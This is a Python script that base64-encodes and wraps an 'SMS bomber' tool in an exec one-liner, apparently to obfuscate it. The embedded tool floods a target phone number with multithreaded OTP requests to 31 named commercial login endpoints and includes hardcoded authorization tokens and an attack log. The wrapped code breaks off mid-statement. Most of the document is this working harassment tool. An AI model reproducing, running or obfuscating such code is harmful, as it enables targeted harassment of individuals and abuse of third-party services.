import base64

# Single line statement
code = """#!/usr/bin/env python3
# ==============================================
# 🐉 Chitti - Ultimate SMS Bomber Suite
# Premium All-in-One Tool for Termux
# ==============================================
# Developer: Roshan 🐉
# Version: 5.0 PRO MAX
# ==============================================

import asyncio
import base64
import json
import os
import sys
import random
import time
import threading
import subprocess
import signal
import platform
import socket
import datetime
import re
import hashlib
import urllib.request
import urllib.parse
import urllib.error
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
    import aiohttp
    import ssl
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    os.system("pip install requests aiohttp colorama")
    import requests
    import aiohttp
    import ssl
    from colorama import init, Fore, Back, Style
    init(autoreset=True)

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==============================================
# 🎨 COLORS & STYLES
# ==============================================
C = {
    'R': Fore.RED,
    'G': Fore.GREEN,
    'Y': Fore.YELLOW,
    'B': Fore.BLUE,
    'M': Fore.MAGENTA,
    'C': Fore.CYAN,
    'W': Fore.WHITE,
    'BL': Fore.BLACK,
    'LR': Fore.LIGHTRED_EX,
    'LG': Fore.LIGHTGREEN_EX,
    'LY': Fore.LIGHTYELLOW_EX,
    'LB': Fore.LIGHTBLUE_EX,
    'LM': Fore.LIGHTMAGENTA_EX,
    'LC': Fore.LIGHTCYAN_EX,
    'LW': Fore.LIGHTWHITE_EX,
    'BR': Style.BRIGHT,
    'DM': Style.DIM,
    'RS': Style.RESET_ALL,
}

# ==============================================
# 🔒 PROTECTION SYSTEM
# ==============================================
PROTECTED_FILE = "THW_protected.json"
CONFIG_FILE = "THW_config.json"
ATTACK_LOG = "THW_attacks.log"

# Default Configuration
DEFAULT_CONFIG = {
    "country_code": "91",
    "delay": 0.3,
    "threads": 25,
    "max_requests": 500,
    "auto_mode": False,
    "theme": "dragon",
    "sound": True,
    "animation": True
}

# ==============================================
# 🎯 API COLLECTION - ALL 31+ WORKING APIS
# ==============================================
API_INDICES = list(range(31))

def get_api_function(phone, api_index, country_code):
    """Execute API attack with given index"""
    cc = str(country_code)
    pn = str(phone)
    session = requests.Session()
    
    try:
        # API 0: OYO Rooms
        if api_index == 0:
            url = f"https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B{cc}&nod=4&phone={pn}"
            response = session.get(url, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 1: Delhivery
        elif api_index == 1:
            url = f"https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={pn}"
            response = session.get(url, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 2: ConfirmTkt
        elif api_index == 2:
            url = f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={pn}"
            response = session.get(url, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 3: PharmEasy
        elif api_index == 3:
            headers = {
                'Host': 'pharmeasy.in',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
                'Accept': '*/*',
                'Content-Type': 'application/json',
            }
            data = {"contactNumber": pn}
            response = session.post('https://pharmeasy.in/api/auth/requestOTP', headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 4: Hero MotoCorp
        elif api_index == 4:
            headers = {
                'Host': 'www.heromotocorp.com',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            }
            data = {'mobile_no': pn, 'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis='}
            response = session.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 5: IndiaLends
        elif api_index == 5:
            headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
            data = {'aeyder03teaeare': '1', 'ertysvfj74sje': cc, 'jfsdfu14hkgertd': pn, 'lj80gertdfg': '0'}
            response = session.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', headers=headers, data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 6: Flipkart Signup
        elif api_index == 6:
            headers = {'Content-Type': 'application/json; charset=utf-8'}
            data = {"loginId": [f"+{cc}{pn}"], "supportAllStates": True}
            response = session.post('https://www.flipkart.com/api/6/user/signup/status', headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 7: Flipkart OTP
        elif api_index == 7:
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            data = {'loginId': f'+{cc}{pn}', 'state': 'VERIFIED', 'churnEmailRequest': 'false'}
            response = session.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 8: Lenskart
        elif api_index == 8:
            data = {'mobile': pn, 'submit': '1'}
            response = session.post('https://www.ref-r.com/clients/lenskart/smsApi', headers={'Content-Type': 'application/x-www-form-urlencoded'}, data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 9: Practo
        elif api_index == 9:
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            data = {'client_name': 'Practo Android App', 'mobile': f'+{cc}{pn}'}
            response = session.post("https://accounts.practo.com/send_otp", headers=headers, data=data, timeout=5)
            return "success" in response.text.lower()
        
        # API 10: PizzaHut
        elif api_index == 10:
            headers = {'Content-Type': 'application/json'}
            data = {"customer": {"MobileNo": pn, "UserName": pn, "merchantId": "98d18d82-ba59-4957-9c92-3f89207a34f6"}}
            response = session.post('https://m.pizzahut.co.in/api/cart/send-otp?langCode=en', headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 11: Goibibo
        elif api_index == 11:
            data = {'mbl': pn}
            response = session.post('https://www.goibibo.com/common/downloadsms/', data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 12: Apollo Pharmacy
        elif api_index == 12:
            data = {'mobile': pn}
            response = session.post('https://www.apollopharmacy.in/sociallogin/mobile/sendotp/', data=data, timeout=5)
            return "sent" in response.text.lower()
        
        # API 13: Ajio
        elif api_index == 13:
            headers = {'Content-Type': 'application/json'}
            data = {"firstName": "User", "login": "user@gmail.com", "password": "Pass@123", "mobileNumber": pn, "requestType": "SENDOTP"}
            response = session.post('https://www.ajio.com/api/auth/signupSendOTP', headers=headers, json=data, timeout=5)
            return '"statusCode":"1"' in response.text
        
        # API 14: AltBalaji
        elif api_index == 14:
            headers = {'Content-Type': 'application/json;charset=UTF-8'}
            data = {"country_code": cc, "phone_number": pn}
            response = session.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN', headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 15: Aala
        elif api_index == 15:
            data = {'email': f'{cc}{pn}', 'firstname': 'User', 'lastname': 'User'}
            response = session.post('https://www.aala.com/accustomer/ajax/getOTP', data=data, timeout=5)
            return 'code:' in response.text
        
        # API 16: Grab
        elif api_index == 16:
            data = {'method': 'SMS', 'countryCode': 'id', 'phoneNumber': f'{cc}{pn}', 'templateID': 'pax_android_production'}
            response = session.post('https://api.grab.com/grabid/v1/phone/otp', data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 17: Gokwik 1
        elif api_index == 17:
            headers = {
                "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo",
                "Content-Type": "application/json",
                "gk-merchant-id": "19g6im8srkz9y"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 18: Gokwik 2
        elif api_index == 18:
            headers = {
                "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzMzc1OCwiZXhwIjoxNzU3NDMzODE4fQ._L8MBwvDff7ijaweocA302oqIA8dGOsJisPydxytvf8",
                "Content-Type": "application/json",
                "gk-merchant-id": "19an4fq2kk5y"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 19: Breeze
        elif api_index == 19:
            headers = {"Content-Type": "application/json"}
            data = {"phoneNumber": pn, "authVerificationType": "otp", "countryCode": f"+{cc}"}
            response = session.post("https://api.breeze.in/session/start", headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 20: Gokwik 3
        elif api_index == 20:
            headers = {
                "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzNTg0OCwiZXhwIjoxNzU3NDM1OTA4fQ._37TKeyXUxkMEEteU2IIVeSENo8TXaNv32x5rWaJbzA",
                "Content-Type": "application/json",
                "gk-merchant-id": "19g6ilhej3mfc"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 21: Kisan
        elif api_index == 21:
            headers = {"Content-Type": "application/json"}
            data = {"mobile_number": pn, "client_id": "kisan-app"}
            response = session.post("https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 22: PenPencil
        elif api_index == 22:
            headers = {"Content-Type": "application/json"}
            data = {"mobile": pn, "organizationId": "5eb393ee95fab7468a79d189"}
            response = session.post("https://api.penpencil.co/v1/users/resend-otp?smsType=2", headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 23: Khatabook
        elif api_index == 23:
            headers = {"Content-Type": "application/json"}
            data = {"country_code": f"+{cc}", "phone": pn, "app_signature": "Jc/Zu7qNqQ2"}
            response = session.post("https://api.khatabook.com/v1/auth/request-otp", headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 24: Jockey
        elif api_index == 24:
            url = f"https://www.jockey.in/apps/jotp/api/login/send-otp/+{cc}{pn}?whatsapp=true"
            response = session.get(url, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 25: Gokwik 4
        elif api_index == 25:
            headers = {
                "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyMTM5OSwiZXhwIjoxNzU3NTIxNDU5fQ.XWlps8Al--idsLa1OYcGNcjgeRk5Zdexo2goBZc1BNA",
                "Content-Type": "application/json",
                "gk-merchant-id": "19kc37zcdyiu"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 26: Vidyakul
        elif api_index == 26:
            data = {'phone': pn, 'rcsconsent': 'true'}
            response = session.post('https://vidyakul.com/signup-otp/send', data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 27: Aditya Birla
        elif api_index == 27:
            headers = {"Content-Type": "application/json"}
            data = {'request': 'CepT08jilRIQiS1EpaNsQVXbRv3PS/eUQ1lAbKfLJuUNvkkemX01P9n5tJiwyfDP3eEXRcol6uGvIAmdehuWBw=='}
            response = session.post('https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp', headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 28: Pinknblu
        elif api_index == 28:
            data = {'_token': 'fbhGqnDcF41IumYCLIyASeXCntgFjC9luBVoSAcb', 'country_code': f'+{cc}', 'phone': pn}
            response = session.post('https://pinknblu.com/v1/auth/generate/otp', data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 29: Udaan
        elif api_index == 29:
            data = {'mobile': pn}
            response = session.post('https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true', data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 30: Nuvama
        elif api_index == 30:
            headers = {"Content-Type": "application/json"}
            data = {"contactInfo": pn, "mode": "SMS"}
            response = session.post('https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO', headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        return False
    except:
        return False

# ==============================================
# 🐉 CHITTHI BANNER
# ==============================================
def get_banner():
    banner = f"""
{C['R']}{C['BR']}
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ██████╗██╗  ██╗██╗████████╗████████╗██╗  ██╗    ,___,       ║
║  ██╔════╝██║  ██║██║╚══██╔══╝╚══██╔══╝██║  ██║    (O.o)       ║
║  ██║     ███████║██║   ██║      ██║   ███████║    /)__)       ║
║  ██║     ██╔══██║██║   ██║      ██║   ██╔══██║   ="="="=      ║
║  ╚██████╗██║  ██║██║   ██║      ██║   ██║  ██║                ║
║   ╚═════╝╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝                ║
║                                                               ║
║              ██████████████████████████████████              ║
║              ██     CHITTHI TOOL v5.0     ██                 ║
║              ██████████████████████████████████              ║
║                                                               ║
║             🐉 PREMIUM ALL-IN-ONE SUITE 🐉                  ║
║                                                               ║
╠═══════════════════════════════════════════════════════════════╣
║  📱 Developer : Roshan                                         ║
║  ⚡ Version   : 5.0 PRO MAX                                  ║
║  🧪 Mode      : LOCAL TESTING                                ║
╚═══════════════════════════════════════════════════════════════╝
{C['R']}{C['BR']}
"""
    return banner   

# ==============================================
# 💾 DATA MANAGEMENT
# ==============================================
def load_protected():
    if not os.path.exists(PROTECTED_FILE):
        return {}
    try:
        with open(PROTECTED_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def save_protected(data):
    with open(PROTECTED_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

def load_config():
    if not os.path.exists(CONFIG_FILE):
        save_config(DEFAULT_CONFIG)
        return DEFAULT_CONFIG
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return DEFAULT_CONFIG

def save_config(data):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

def log_attack(phone, requests_sent, success_count):
    with open(ATTACK_LOG, "a", encoding="utf-8") as f:
        f.write(f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {phone} | {requests_sent} | {success_count}\n")

def encrypt_number(phone):
    return base64.b64encode(phone.encode()).decode()

def is_protected(phone):
    data = load_protected()
    return phone in data

def protect_number(phone, name="Protected"):
    data = load_protected()
    data[phone] = {
        "phone": phone,
        "name": name,
        "encrypted": encrypt_number(phone),
        "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_protected(data)
    return True

def remove_protected(phone):
    data = load_protected()
    if phone in data:
        del data[phone]
        save_protected(data)
        return True
    return False

# ==============================================
# 💥 BOMBING ENGINE
# ==============================================
class BombingEngine:
    def __init__(self):
        self.active = {}
        self.counts = {}
        self.lock = threading.Lock()
        self.config = load_config()
        self.executor = ThreadPoolExecutor(max_workers=50)
        
    def start_attack(self, phone, max_requests=None, threads=None):
        if max_requests is None:
            max_requests = self.config.get("max_requests", 500)
        if threads is None:
            threads = self.config.get("threads", 25)
            
        # Validate phone
        phone = self.clean_phone(phone)
        if not phone or len(phone) != 10:
            return False, "Invalid phone number"
        
        # Check protection
        if is_protected(phone):
            return False, "Number is protected!"
        
        # Check if already running
        if phone in self.active and self.active[phone]:
            return False, "Attack already running!"
        
        self.active[phone] = True
        self.counts[phone] = 0
        self.config = load_config()
        
        # Start threads
        for i in range(threads):
            self.executor.submit(self._worker, phone, max_requests)
        
        return True, f"Attack started with {threads} threads!"
    
    def _worker(self, phone, max_requests):
        available_apis = API_INDICES.copy()
        cc = self.config.get("country_code", "91")
        delay = self.config.get("delay", 0.3)
        
        while self.active.get(phone, False) and self.counts.get(phone, 0) < max"""
encoded = base64.b64encode(code.encode()).decode()

print(f"exec(__import__('base64').b64decode('{encoded}').decode())")
